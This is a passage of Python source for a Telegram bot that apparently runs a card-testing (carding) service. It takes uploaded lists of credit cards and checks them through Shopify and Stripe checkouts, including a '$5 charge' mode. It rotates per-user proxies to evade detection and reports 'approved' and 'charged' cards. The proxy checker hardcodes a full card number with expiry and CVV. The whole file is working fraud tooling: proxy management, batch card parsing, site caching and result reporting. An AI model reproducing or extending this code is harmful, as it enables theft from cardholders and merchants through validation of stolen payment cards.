                await update.message.reply_text(f"No proxy found for user {target_id}.")
                return
            
            proxy_info = await get_user_proxy_info(target_id)
            name = ""
            username = ""
            if proxy_info:
                _, name, username = proxy_info
            
            user_link = f'<a href="tg://user?id={target_id}">{username if username else (name if name else str(target_id))}</a>'
            msg = f"Proxies for user {user_link}"
            if name and username:
                msg += f" ({name})"
            msg += f":\n\n"
            
            for i, proxy_url in enumerate(proxies, 1):
                masked_proxy = mask_proxy_password(proxy_url)
                msg += f"{i}. <code>{masked_proxy}</code>\n"
            
            await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
            
        except ValueError:
            await update.message.reply_text("Invalid user ID. Usage: /show <user_id>")
            return
        except Exception as e:
            logger.error(f"Error in /show command: {e}")
            await update.message.reply_text(f"Error retrieving proxy information: {e}")
            return
            
    else:
        try:
            saved = await get_user_proxies(user.id)
        except Exception:
            saved = []

        if not saved:
            await update.message.reply_text("You don't have any proxy set. Use /setpr to set one.")
            return

        lines = []
        for i, p in enumerate(saved, 1):
            lines.append(f"{i}. {p}")

        msg = f"You have {len(saved)} proxy(ies) configured:\n" + "\n".join(lines)
        await update.message.reply_text(msg)

async def cmd_rmproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a specific proxy"""
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    args = context.args or []
    
    if not args:
        try:
            saved = await get_user_proxies(user.id)
        except Exception:
            saved = []
        
        if not saved:
            await update.message.reply_text("You don't have any proxies set.")
            return
        
        lines = []
        for i, p in enumerate(saved, 1):
            lines.append(f"{i}. {p}")
        
        msg = "Usage: /rmproxy <number>\n\nYour proxies:\n" + "\n".join(lines)
        await update.message.reply_text(msg)
        return
    
    try:
        proxy_num = int(args[0])
        saved = await get_user_proxies(user.id)
        
        if proxy_num < 1 or proxy_num > len(saved):
            await update.message.reply_text(f"Invalid number. Please use a number between 1 and {len(saved)}.")
            return
        
        proxy_to_remove = saved[proxy_num - 1]
        
        await remove_user_proxy(user.id, proxy_to_remove, "Manual removal by user")
        
        # Check if all proxies are removed and pause active checks
        remaining = await get_user_proxies(user.id)
        if len(remaining) == 0:
            # Pause all active checks for this user and update their proxies_list
            try:
                async with ACTIVE_LOCK:
                    paused_count = 0
                    for batch_id, batch_info in ACTIVE_BATCHES.items():
                        if batch_info.get("user_id") == user.id:
                            # Update the runner's proxies_list if it exists
                            runner = batch_info.get("runner")
                            if runner and hasattr(runner, 'proxies_list'):
                                runner.proxies_list = []
                                runner.proxies_mapping = None
                                runner.paused_for_proxies = True
                                # Set cancel event to stop processing immediately
                                if hasattr(runner, 'cancel_event') and runner.cancel_event:
                                    runner.cancel_event.set()
                            # Also set the event in batch_info
                            batch_info["cancelled"] = True
                            if "event" in batch_info:
                                batch_info["event"].set()
                            # Update ACTIVE_BATCHES to reflect pause status
                            batch_info["paused_for_proxies"] = True
                            ACTIVE_BATCHES[batch_id] = batch_info
                            paused_count += 1
                    if paused_count > 0:
                        await update.message.reply_text(
                            f"✅ Removed proxy #{proxy_num}\n\n"
                            f"⚠️ <b>All Proxies Removed - {paused_count} Check(s) Paused</b>\n\n"
                            f"Add new proxies with /setpr to resume your checks.",
                            parse_mode=ParseMode.HTML
                        )
                        return
            except Exception:
                pass
        
        await update.message.reply_text(f"✅ Removed proxy #{proxy_num}: {proxy_to_remove}")
        
    except ValueError:
        proxy_url = " ".join(args)
        
        try:
            saved = await get_user_proxies(user.id)
            if proxy_url not in saved:
                await update.message.reply_text("That proxy is not in your list.")
                return
            
            await remove_user_proxy(user.id, proxy_url, "Manual removal by user")
            
            # Check if all proxies are removed and pause active checks
            remaining = await get_user_proxies(user.id)
            if len(remaining) == 0:
                # Pause all active checks for this user and update their proxies_list
                try:
                    async with ACTIVE_LOCK:
                        paused_count = 0
                        for batch_id, batch_info in ACTIVE_BATCHES.items():
                            if batch_info.get("user_id") == user.id:
                                # Update the runner's proxies_list if it exists
                                runner = batch_info.get("runner")
                                if runner and hasattr(runner, 'proxies_list'):
                                    runner.proxies_list = []
                                    runner.proxies_mapping = None
                                    runner.paused_for_proxies = True
                                    # Set cancel event to stop processing immediately
                                    if hasattr(runner, 'cancel_event') and runner.cancel_event:
                                        runner.cancel_event.set()
                                # Also set the event in batch_info
                                batch_info["cancelled"] = True
                                if "event" in batch_info:
                                    batch_info["event"].set()
                                # Update ACTIVE_BATCHES to reflect pause status
                                batch_info["paused_for_proxies"] = True
                                ACTIVE_BATCHES[batch_id] = batch_info
                                paused_count += 1
                        if paused_count > 0:
                            masked = mask_proxy_password(proxy_url)
                            await update.message.reply_text(
                                f"✅ Removed proxy: {masked}\n\n"
                                f"⚠️ <b>All Proxies Removed - {paused_count} Check(s) Paused</b>\n\n"
                                f"Add new proxies with /setpr to resume your checks.",
                                parse_mode=ParseMode.HTML
                            )
                            return
                except Exception:
                    pass
            
            masked = mask_proxy_password(proxy_url)
            await update.message.reply_text(f"✅ Removed proxy: {masked}")
        except Exception as e:
            await update.message.reply_text(f"Failed to remove proxy: {e}")

async def cmd_rmpr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: Remove specific proxy(ies) from another user
    
    Usage:
    /rmpr <user_id> <proxy_number> [proxy_number2] [proxy_number3] ...
    Examples:
    - /rmpr 5646492454 2 (remove single proxy)
    - /rmpr 5646492454 3 4 5 (remove multiple proxies)
    """
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Only admins can remove other users' proxies.")
        return
    
    args = context.args or []
    
    if len(args) < 2:
        await update.message.reply_text(
            "❌ Invalid usage.\n\n"
            "<b>Usage:</b> /rmpr &lt;user_id&gt; &lt;proxy_number&gt; [proxy_number2] ...\n\n"
            "<b>Examples:</b>\n"
            "• /rmpr 5646492454 2 - Remove proxy #2\n"
            "• /rmpr 5646492454 3 4 5 - Remove proxies #3, #4, #5\n\n"
            "Proxy numbers are as shown in /show &lt;user_id&gt;",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_user_id = int(args[0])
    except ValueError:
        await update.message.reply_text(f"❌ Invalid user ID: '{args[0]}'. User ID must be a number.")
        return
    
    # Check if user is restricted
    if target_user_id in RESTRICTED_USER_IDS:
        await update.message.reply_text("❌ Restricted")
        return
    
    # Parse all proxy numbers
    proxy_nums = []
    invalid_nums = []
    for arg in args[1:]:
        try:
            num = int(arg)
            proxy_nums.append(num)
        except ValueError:
            invalid_nums.append(arg)
    
    if invalid_nums:
        await update.message.reply_text(
            f"❌ Invalid proxy numbers: {', '.join(invalid_nums)}\n"
            f"All proxy numbers must be integers."
        )
        return
    
    if not proxy_nums:
        await update.message.reply_text("❌ Please specify at least one proxy number to remove.")
        return
    
    # Remove duplicates and sort
    proxy_nums = sorted(set(proxy_nums))
    
    # Get target user's proxies
    try:
        saved = await get_user_proxies(target_user_id)
    except Exception:
        saved = []
    
    if not saved:
        await update.message.reply_text(f"❌ User {target_user_id} doesn't have any proxies set.")
        return
    
    # Validate all proxy numbers
    invalid_ranges = [num for num in proxy_nums if num < 1 or num > len(saved)]
    if invalid_ranges:
        await update.message.reply_text(
            f"❌ Invalid proxy number(s): {', '.join(map(str, invalid_ranges))}\n"
            f"User {target_user_id} has {len(saved)} proxy(ies).\n"
            f"Valid range: 1-{len(saved)}"
        )
        return
    
    # Get user info for confirmation message
    proxy_info = await get_user_proxy_info(target_user_id)
    name = ""
    username = ""
    if proxy_info:
        _, name, username = proxy_info
    user_display = username if username else (name if name else str(target_user_id))
    
    # Remove proxies in reverse order to avoid index shifting
    removed_proxies = []
    for num in reversed(proxy_nums):
        try:
            proxy_to_remove = saved[num - 1]
            await remove_user_proxy(target_user_id, proxy_to_remove, "Manual removal by admin")
            masked_proxy = mask_proxy_password(proxy_to_remove)
            removed_proxies.append((num, masked_proxy))
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to remove proxy #{num}: {e}")
            return
    
    # Reverse the list to show in original order
    removed_proxies.reverse()
    
    # Check if all proxies are removed and pause active checks
    remaining = await get_user_proxies(target_user_id)
    if len(remaining) == 0:
        # Pause all active checks for this user
        try:
            async with ACTIVE_LOCK:
                paused_count = 0
                for batch_id, batch_info in ACTIVE_BATCHES.items():
                    if batch_info.get("user_id") == target_user_id:
                        # Update the runner's proxies_list if it exists
                        runner = batch_info.get("runner")
                        if runner and hasattr(runner, 'proxies_list'):
                            runner.proxies_list = []
                            runner.proxies_mapping = None
                            runner.paused_for_proxies = True
                            # Set cancel event to stop processing immediately
                            if hasattr(runner, 'cancel_event') and runner.cancel_event:
                                runner.cancel_event.set()
                        # Also set the event in batch_info
                        batch_info["cancelled"] = True
                        if "event" in batch_info:
                            batch_info["event"].set()
                        # Update ACTIVE_BATCHES to reflect pause status
                        batch_info["paused_for_proxies"] = True
                        ACTIVE_BATCHES[batch_id] = batch_info
                        paused_count += 1
                if paused_count > 0:
                    # Build message with pause notification
                    if len(removed_proxies) == 1:
                        num, masked = removed_proxies[0]
                        msg = (
                            f"✅ <b>Removed proxy #{num}</b>\n\n"
                            f"<b>User:</b> {user_display} ({target_user_id})\n"
                            f"<b>Proxy:</b> <code>{masked}</code>\n\n"
                            f"⚠️ <b>All Proxies Removed - {paused_count} Check(s) Paused</b>\n\n"
                            f"User must add new proxies with /setpr to resume checks."
                        )
                    else:
                        msg_lines = [
                            f"✅ <b>Removed {len(removed_proxies)} proxies</b>\n",
                            f"<b>User:</b> {user_display} ({target_user_id})\n"
                        ]
                        for num, masked in removed_proxies:
                            msg_lines.append(f"• #{num}: <code>{masked}</code>")
                        msg_lines.append(f"\n⚠️ <b>All Proxies Removed - {paused_count} Check(s) Paused</b>")
                        msg_lines.append(f"User must add new proxies with /setpr to resume checks.")
                        msg = "\n".join(msg_lines)
                    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
                    return
        except Exception:
            pass
    
    # Build confirmation message (if not all proxies removed)
    if len(removed_proxies) == 1:
        num, masked = removed_proxies[0]
        msg = (
            f"✅ <b>Removed proxy #{num}</b>\n\n"
            f"<b>User:</b> {user_display} ({target_user_id})\n"
            f"<b>Proxy:</b> <code>{masked}</code>\n\n"
            f"Remaining proxies: {len(saved) - 1}"
        )
    else:
        msg_lines = [
            f"✅ <b>Removed {len(removed_proxies)} proxies</b>\n",
            f"<b>User:</b> {user_display} ({target_user_id})\n"
        ]
        for num, masked in removed_proxies:
            msg_lines.append(f"• #{num}: <code>{masked}</code>")
        msg_lines.append(f"\nRemaining proxies: {len(saved) - len(removed_proxies)}")
        msg = "\n".join(msg_lines)
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def cmd_clearproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove all proxies"""
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    
    try:
        saved = await get_user_proxies(user.id)
        if not saved:
            await update.message.reply_text("You don't have any proxies set.")
            return
        
        count = len(saved)
        await clear_user_proxy(user.id)
        
        # Pause all active checks for this user since all proxies are removed
        try:
            async with ACTIVE_LOCK:
                paused_count = 0
                for batch_id, batch_info in ACTIVE_BATCHES.items():
                    if batch_info.get("user_id") == user.id:
                        # Update the runner's proxies_list if it exists
                        runner = batch_info.get("runner")
                        if runner and hasattr(runner, 'proxies_list'):
                            runner.proxies_list = []
                            runner.proxies_mapping = None
                            runner.paused_for_proxies = True
                            # Set cancel event to stop processing immediately
                            if hasattr(runner, 'cancel_event') and runner.cancel_event:
                                runner.cancel_event.set()
                        # Also set the event in batch_info
                        batch_info["cancelled"] = True
                        if "event" in batch_info:
                            batch_info["event"].set()
                        # Update ACTIVE_BATCHES to reflect pause status
                        batch_info["paused_for_proxies"] = True
                        ACTIVE_BATCHES[batch_id] = batch_info
                        paused_count += 1
                if paused_count > 0:
                    await update.message.reply_text(
                        f"✅ Removed all {count} proxy(ies).\n\n"
                        f"⚠️ <b>All Proxies Removed - {paused_count} Check(s) Paused</b>\n\n"
                        f"Add new proxies with /setpr to resume your checks.",
                        parse_mode=ParseMode.HTML
                    )
                    return
        except Exception:
            pass
        
        await update.message.reply_text(f"✅ Removed all {count} proxy(ies).")
    except Exception as e:
        await update.message.reply_text(f"Failed to clear proxies: {e}")

async def cmd_cleanproxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: Clean up all invalid/junk proxies from database"""
    user = update.effective_user
    
    if not is_admin(user.id):
        await update.message.reply_text("❌ Only admins can clean proxies database.")
        return
    
    processing_msg = await update.message.reply_text("🔄 Scanning proxy database for invalid entries...")
    
    try:
        with PROXIES_LOCK:
            recs = _read_proxy_records()
            original_count = len(recs)
            
            cleaned_recs = []
            removed_count = 0
            
            # Invalid proxy indicators
            junk_markers = ["⌁", "status:", "code:", "site:", "amount:", "receipt:", "user:", "card:", 
                          "declined", "approved", "charged", "💎", "❎", "❌", "completed:", "processing"]
            
            for (uid, name, username, proxy, timestamp) in recs:
                proxy_lower = proxy.lower()
                
                # Check if proxy contains junk markers
                is_junk = any(marker in proxy_lower or marker in proxy for marker in junk_markers)
                
                # Check if proxy looks valid (should contain : and either @ or just numbers/dots)
                looks_valid = ":" in proxy and (
                    "@" in proxy or  # user:pass@host:port format
                    any(c.isdigit() for c in proxy)  # should have numbers for IP/port
                )
                
                # Check for obviously malformed URLs
                if proxy.startswith("http://http://") or proxy.startswith("https://http://"):
                    is_junk = True
                
                # Check for encoded junk
                if "%2F" in proxy or "%3A" in proxy or "%40" in proxy:
                    # URL encoded characters in proxy might indicate malformed data
                    # But allow if it still looks like a valid proxy format
                    if not looks_valid:
                        is_junk = True
                
                if is_junk or not looks_valid:
                    removed_count += 1
                else:
                    cleaned_recs.append((uid, name, username, proxy, timestamp))
            
            # Write cleaned records back
            _write_proxy_records(cleaned_recs)
            
            await processing_msg.edit_text(
                f"✅ <b>Proxy Database Cleaned!</b>\n\n"
                f"📊 Original entries: {original_count}\n"
                f"🗑 Removed invalid: {removed_count}\n"
                f"✅ Remaining valid: {len(cleaned_recs)}\n\n"
                f"Cleaned {removed_count} junk entries from database.",
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        await processing_msg.edit_text(f"❌ Failed to clean proxies: {e}")

async def cmd_chkpr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check saved proxies by testing them
    
    Usage:
    /chkpr - Check your own proxies
    /chkpr <user_id> - (Admin only) Check proxies for specific user
    """
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    target_user_id = user.id
    target_user_name = user.full_name or f"@{user.username}" or str(user.id)
    
    # Check if admin is checking another user's proxies
    # Parse arguments from context.args or message text
    args = context.args or []
    if not args and update.message and update.message.text:
        # Fallback: parse from message text if context.args is empty
        full_text = (update.message.text or "").strip()
        if full_text.startswith("/chkpr"):
            parts = full_text.split(None, 1)  # Split on whitespace, max 1 split
            if len(parts) > 1:
                args = [parts[1].strip()]
    
    if args:
        if not is_admin(user.id):
            await update.message.reply_text("❌ Only admins can check other users' proxies.\n\nUse /chkpr (without user ID) to check your own proxies.")
            return
        
        try:
            user_id_str = args[0].strip()
            # Remove any @ symbols if present
            if user_id_str.startswith("@"):
                user_id_str = user_id_str[1:]
            
            # Validate it's a numeric string
            if not user_id_str.isdigit():
                await update.message.reply_text(f"❌ Invalid user ID format. User ID must be a number.\n\nReceived: '{user_id_str}'\nUsage: /chkpr <user_id>")
                return
            
            target_user_id = int(user_id_str)
            
            # Validate user ID is reasonable (Telegram user IDs are typically 6-10 digits)
            if target_user_id < 1 or target_user_id > 9999999999:
                await update.message.reply_text(f"❌ Invalid user ID. User ID must be between 1 and 9999999999.\n\nReceived: {target_user_id}")
                return
            
            # Check if user is restricted
            if target_user_id in RESTRICTED_USER_IDS:
                await update.message.reply_text("❌ Restricted")
                return
            
            # Get user info
            user_info = await get_user_info_for_proxy(target_user_id)
            if user_info:
                display_name, username = user_info
                target_user_name = username if username else (display_name if display_name else f"User {target_user_id}")
            else:
                target_user_name = f"User {target_user_id}"
        except (ValueError, TypeError) as e:
            await update.message.reply_text(f"❌ Invalid user ID. Usage: /chkpr <user_id>\n\nError: {type(e).__name__}: {str(e)}")
            return
    
    # Get user's saved proxies
    try:
        user_proxies = await get_user_proxies(target_user_id)
    except Exception:
        user_proxies = []
    
    if not user_proxies:
        if target_user_id == user.id:
            await update.message.reply_text("❌ You don't have any proxies saved.\n\nUse /setpr to add proxies.")
        else:
            await update.message.reply_text(f"❌ User {target_user_name} doesn't have any proxies saved.")
        return
    
    # Get test cards and sites
    test_cards = [
        {
            "number": "4906388577508357",
            "month": "11",
            "year": "28",
            "verification_value": "824"
        }
    ]
    
    sites = _get_cached_sites()
    if not sites:
        await update.message.reply_text("❌ No sites found in working_sites.txt.")
        return
    
    test_sites = list(sites)
    if len(test_sites) > 3:
        test_sites = random.sample(test_sites, 3)
    
    total_proxies = len(user_proxies)
    checking_msg = await update.message.reply_text(
        f"🔍 <b>Checking {total_proxies} proxy(ies) for {target_user_name}...</b>\n\n"
        f"Testing against {len(test_sites[:2])} random sites.\n"
        f"Please wait...",
        parse_mode=ParseMode.HTML
    )
    
    loop = asyncio.get_running_loop()
    semaphore = asyncio.Semaphore(10)
    
    async def test_single_proxy(p, idx):
        async with semaphore:
            proxy_status = "unknown"
            response_msg = ""
            test_time_start = time.time()
            
            for test_site in test_sites[:2]:
                try:
                    test_result = await loop.run_in_executor(
                        GLOBAL_EXECUTOR,
                        check_single_card,
                        test_cards[0],
                        [test_site],
                        {"http": p, "https": p},
                        None
                    )
                    if len(test_result) >= 6:
                        status = test_result[0]
                        code_display = test_result[1]
                        
                        if status in ("approved", "declined", "charged"):
                            proxy_status = "working"
                            response_msg = status.upper()
                            break
                        elif status == "unknown":
                            msg = (code_display or "").lower() if isinstance(code_display, str) else ""
                            proxy_error_signals = [
                                "unable to connect to proxy",
                                "proxyerror",
                                "max retries exceeded",
                                "tunnel connection failed",
                                "connect timeout",
                                "connection refused",
                                "connection timed out",
                                "proxy server",
                                "proxy connection"
                            ]
                            if any(sig in msg for sig in proxy_error_signals):
                                proxy_status = "dead"
                                response_msg = "Connection Failed"
                                break
                except Exception as e:
                    proxy_status = "error"
                    response_msg = str(e)[:50]
            
            if proxy_status == "unknown":
                proxy_status = "dead"
                response_msg = "No Valid Response"
            
            test_time = time.time() - test_time_start
            
            return (p, proxy_status, response_msg, idx, test_time)
    
    tasks = [test_single_proxy(p, idx) for idx, p in enumerate(user_proxies, 1)]
    results = await asyncio.gather(*tasks)
    
    # Organize results
    working_proxies = []
    dead_proxies = []
    
    for p, status, msg, idx, test_time in results:
        masked_proxy = _mask_proxy_display(p)
        if status == "working":
            working_proxies.append(f"{idx}. ✅ {masked_proxy}\n   Status: {msg} ({test_time:.1f}s)")
        else:
            dead_proxies.append(f"{idx}. ❌ {masked_proxy}\n   Error: {msg}")
    
    # Delete checking message
    try:
        await checking_msg.delete()
    except Exception:
        pass
    
    # Send results
    header = f"🔍 <b>Proxy Check Results for {target_user_name}</b>\n\n"
    header += f"📊 Total: {total_proxies} | ✅ Working: {len(working_proxies)} | ❌ Dead: {len(dead_proxies)}\n"
    header += "━━━━━━━━━━━━━━━━━━━━\n\n"
    
    if working_proxies:
        working_text = "<b>✅ Working Proxies:</b>\n" + "\n".join(working_proxies)
        if len(header + working_text) < 4000:
            await update.message.reply_text(header + working_text, parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(header, parse_mode=ParseMode.HTML)
            # Send in batches
            batch_size = 10
            for i in range(0, len(working_proxies), batch_size):
                batch = working_proxies[i:i+batch_size]
                await update.message.reply_text("\n".join(batch), parse_mode=ParseMode.HTML)
    
    if dead_proxies:
        dead_text = "\n<b>❌ Dead/Failed Proxies:</b>\n" + "\n".join(dead_proxies)
        if len(dead_text) < 4000:
            await update.message.reply_text(dead_text, parse_mode=ParseMode.HTML)
        else:
            # Send in batches
            await update.message.reply_text("<b>❌ Dead/Failed Proxies:</b>", parse_mode=ParseMode.HTML)
            batch_size = 10
            for i in range(0, len(dead_proxies), batch_size):
                batch = dead_proxies[i:i+batch_size]
                await update.message.reply_text("\n".join(batch), parse_mode=ParseMode.HTML)
    
    # Suggest cleanup if dead proxies found
    if dead_proxies and target_user_id == user.id:
        await update.message.reply_text(
            f"\n💡 <b>Tip:</b> Remove dead proxies with /rmproxy <number> or /clearproxy",
            parse_mode=ParseMode.HTML
        )

GLOBAL_EXECUTOR = ThreadPoolExecutor(max_workers=GLOBAL_MAX_WORKERS)
SMALL_BATCH_THRESHOLD = 6
SMALL_TASK_EXECUTOR = ThreadPoolExecutor(max_workers=50)  # Increased from 12 for faster small batches

# ==== OPTIMIZATION: Cache for sites and file parsing ====
SITES_CACHE = None
SITES_CACHE_LOCK = threading.Lock()
SITES_CACHE_MTIME = 0

def _get_cached_sites(force_reload=False):
    """Load sites from file with caching to avoid repeated disk reads"""
    global SITES_CACHE, SITES_CACHE_MTIME
    
    sites_file = "working_sites.txt"
    
    try:
        # Check if file has been modified
        current_mtime = os.path.getmtime(sites_file)
        
        with SITES_CACHE_LOCK:
            # Return cached version if file hasn't changed
            if not force_reload and SITES_CACHE is not None and current_mtime == SITES_CACHE_MTIME:
                return list(SITES_CACHE)  # Return copy to prevent modification
            
            # Read and cache
            sites = checkout.read_sites_from_file(sites_file)
            SITES_CACHE = sites
            SITES_CACHE_MTIME = current_mtime
            return list(sites) if sites else []
    except Exception:
        # If file doesn't exist or error, return cached version if available
        with SITES_CACHE_LOCK:
            return list(SITES_CACHE) if SITES_CACHE else []

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    await update.message.reply_text(
        "🎯 <b>Welcome to the Bot!</b> 🎯\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 <b>Quick Start:</b>\n\n"
        "📄 <b>Batch Check:</b> Reply to a .txt file with <code>/txt</code>\n"
        "   • Upload a .txt file with CCs (one per line)\n"
        "   • Reply to the file with <code>/txt</code>\n"
        "   • Bot will check all cards automatically\n\n"
        "💳 <b>Single/Multiple Cards:</b>\n"
        "   • <code>/sh &lt;cc&gt;</code> — AutoShopify Check\n"
        "   • <code>/st &lt;cc&gt;</code> — Stripe Auth Check\n"
        "   • <code>/sc &lt;cc&gt;</code> — Stripe Charge $5\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🌐 <b>Proxy Management:</b>\n\n"
        "🔹 <code>/setpr &lt;proxy&gt;</code> — Add Proxy (1 or more)\n"
        "🔹 <code>/show</code> — Show your current proxies\n"
        "🔹 <code>/chkpr</code> — Test your saved proxies\n"
        "🔹 <code>/rmproxy &lt;number&gt;</code> — Remove a specific proxy\n"
        "🔹 <code>/clearproxy</code> — Remove all proxies\n\n"
        "⚙️ <b>Control & Information:</b>\n\n"
        "🔹 <code>/stop</code> — Stop your running batch\n"
        "🔹 <code>/active</code> — Show current active checks\n"
        "🔹 <code>/me</code> — Show your personal stats\n"
        "🔹 <code>/stats</code> — Show global leaderboard\n"
        "🔹 <code>/site</code> — Show number of active sites\n"
        "🔹 <code>/chksite &lt;url&gt;</code> — Test if a site works\n"
        "🔹 <code>/chk</code> — Check URLs from txt file\n"
        "🔹 <code>/achk</code> — Check URLs from txt file and filter by amount\n"
        "🔹 <code>/start</code> — Show this help menu\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👨‍💻 <b>Developer:</b> @LeVetche\n"
        "📢 <b>Join our GC:</b> https://t.me/+l1aMGXxYLRYyZDZk",
        parse_mode=ParseMode.HTML
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    
    doc: Document = update.message.document
    if not doc:
        return
    
    file_name = doc.file_name or ""
    if not file_name.lower().endswith(".txt"):
        return
    
    ensure_uploads_dir()
    try:
        file = await context.bot.get_file(doc.file_id)
        prefix = _username_prefix_for_file(update.effective_user)
        ts = int(time.time())
        local_path = os.path.join(UPLOADS_DIR, f"{prefix}_{update.effective_user.id}_{ts}_{file_name}")
        await file.download_to_drive(custom_path=local_path)
        context.chat_data["last_txt_path"] = local_path
    except Exception as e:
        await update.message.reply_text(f"Failed to download file: {e}")

async def cmd_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    
    # Check if user already has an active batch (admins bypass)
    if await has_active_batch(user.id):
        await update.message.reply_text(
            "⏸️ <b>Already Running a Check</b>\n\n"
            "You already have an active check running. Please wait for it to complete or use /stop to cancel it.\n\n"
            "You can only run one check at a time.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # OPTIMIZATION: Run proxy check and file download in parallel
    proxy_check_task = asyncio.create_task(_check_user_has_proxy(user))
    
    # Handle file download/retrieval
    replied = update.message.reply_to_message
    txt_path = None
    if replied and replied.document and (replied.document.file_name or "").lower().endswith(".txt"):
        try:
            file = await context.bot.get_file(replied.document.file_id)
            ensure_uploads_dir()
            prefix = _username_prefix_for_file(update.effective_user)
            ts = int(time.time())
            local_path = os.path.join(UPLOADS_DIR, f"{prefix}_{update.effective_user.id}_{ts}_{replied.document.file_name}")
            await file.download_to_drive(custom_path=local_path)
            txt_path = local_path
        except Exception:
            txt_path = context.chat_data.get("last_txt_path")
    else:
        txt_path = context.chat_data.get("last_txt_path")

    # Check proxy result
    has_proxy = await proxy_check_task
    if not has_proxy:
        await update.message.reply_text("❌ <b>Proxy Required</b>\n\nPlease add a proxy first with /setpr", parse_mode=ParseMode.HTML)
        return

    if not txt_path or not os.path.exists(txt_path):
        await update.message.reply_text("No .txt file found. Please send a .txt file and reply with /txt.")
        return

    # OPTIMIZATION: Parse cards and load sites in parallel using executor to avoid blocking
    loop = asyncio.get_event_loop()
    cards_task = loop.run_in_executor(GLOBAL_EXECUTOR, parse_cards_from_file, txt_path)
    sites_task = loop.run_in_executor(GLOBAL_EXECUTOR, _get_cached_sites)
    
    # Wait for both to complete
    cards, sites = await asyncio.gather(cards_task, sites_task)
    
    if not cards:
        await update.message.reply_text("No valid CC entries found in the file.")
        return

    if not sites:
        await update.message.reply_text("No sites found in working_sites.txt.")
        return

    # OPTIMIZATION: Use smart site selection based on health scores (ALL sites, just reordered)
    optimized_sites = get_optimized_sites(sites, min_health_score=30.0, max_sites=None)
    logger.info(f"[/txt] Optimized sites: {len(sites)} → {len(optimized_sites)}")

    context.chat_data["pending_cards"] = cards
    context.chat_data["pending_sites"] = optimized_sites
    context.chat_data["pending_title"] = "File Batch"

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes", callback_data="PREF_APPROVED:YES")],
        [InlineKeyboardButton("No", callback_data="PREF_APPROVED:NO")],
    ])
    await update.message.reply_text(
        "Do you want Approved CC in txt?\nChoose Yes to receive Approved CCs in chat.\nChoose No to only receive Charged CC.",
        reply_markup=keyboard
    )

# Helper function for proxy checking (can be reused)
async def _check_user_has_proxy(user) -> bool:
    """Check if user has proxy configured. Returns True if has proxy, False otherwise."""
    try:
        user_proxies = await get_user_proxies(user.id)
        return bool(user_proxies)
    except Exception:
        return False

async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    full_text = (update.message.text or "").strip()
    body = ""

    try:
        if full_text.lower().startswith("/mass"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""

    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()

    if not body:
        replied = update.message.reply_to_message
        if replied and isinstance(getattr(replied, "text", None), str) and replied.text.strip():
            body = replied.text.strip()

    if not body:
        await update.message.reply_text("Usage:\n/mass <single CC or multiline CCs>")
        return

    def _normalize_proxy_url_inline(p: Optional[str]) -> Optional[str]:
        try:
            if not p:
                return None
            s = p.strip()
            if not s or s.startswith("#"):
                return None
            lower = s.lower()
            if lower.startswith(("http://", "https://", "socks5://", "socks5h://")):
                return s
            parts = s.split(":")
            if len(parts) >= 4:
                host = parts[0]
                port = parts[1]
                user = ":".join(parts[2:-1]) if len(parts) > 4 else parts[2]
                pwd = parts[-1]
                try:
                    from urllib.parse import quote as _q
                except Exception:
                    def _q(x, safe=""):
                        return x
                user_enc = _q(user, safe="")
                pwd_enc = _q(pwd, safe="")
                return f"http://{user_enc}:{pwd_enc}@{host}:{port}"
            return f"http://{s}"
        except Exception:
            return None

    def _extract_proxy_from_text_inline(text: str) -> Tuple[Optional[str], str]:
        try:
            lines = (text or "").splitlines()
        except Exception:
            return None, text
        proxy_raw = None
        remaining = []
        for ln in lines:
            s = (ln or "").strip()
            low = s.lower()
            if low.startswith("proxy=") or low.startswith("proxy:") or low.startswith("proxy "):
                proxy_raw = s.split("=",1)[1].strip() if "=" in s else s.split(":",1)[1].strip() if ":" in s else s.split(" ",1)[1].strip() if " " in s else ""
                continue
            if low.startswith("px=") or low.startswith("px:") or low.startswith("px "):
                proxy_raw = s.split("=",1)[1].strip() if "=" in s else s.split(":",1)[1].strip() if ":" in s else s.split(" ",1)[1].strip() if " " in s else ""
                continue
            remaining.append(ln)
        return (proxy_raw if proxy_raw else None), "\n".join(remaining)

    proxy_candidate_raw, body_clean = _extract_proxy_from_text_inline(body)
    cards = parse_cards_from_text(body_clean)
    if not cards:
        await update.message.reply_text("No valid CC entries provided.")
        return

    orig_total = len(cards)
    if orig_total > 100:
        await update.message.reply_text(f"Limit is 100 CC for /sh. Received {orig_total}, processing first 100.")
        cards = cards[:100]

    sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.message.reply_text("No sites found in working_sites.txt.")
        return

    proxies_override = None
    try:
        saved_list = await get_user_proxies(update.effective_user.id)
        if isinstance(saved_list, list) and len(saved_list) > 0:
            proxies_override = list(saved_list)
            try:
                pass
            except Exception:
